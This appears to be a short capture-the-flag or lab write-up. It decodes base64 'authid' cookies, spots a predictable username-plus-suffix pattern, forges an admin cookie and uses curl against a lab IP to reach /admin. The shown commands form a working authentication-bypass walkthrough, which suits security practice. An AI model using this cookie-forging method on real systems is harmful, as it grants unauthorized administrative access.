## Found `authid` pattern
```
$ echo 'dGVzdHY0ZXI5bGwxIXNz' | base64 -d
testv4er9ll1!ss%
$ echo 'aGVsbG92NGVyOWxsMSFzcw==' | base64 -d
hellov4er9ll1!ss%
```

## Login as admin
```
$ echo -n 'mcinventoryv4er9ll1!ss' | base64
bWNpbnZlbnRvcnl2NGVyOWxsMSFzcw==
$ curl -H 'Cookie: authid=bWNpbnZlbnRvcnl2NGVyOWxsMSFzcw==' http://10.10.113.56:3000/home
Found. Redirecting to /admin
```

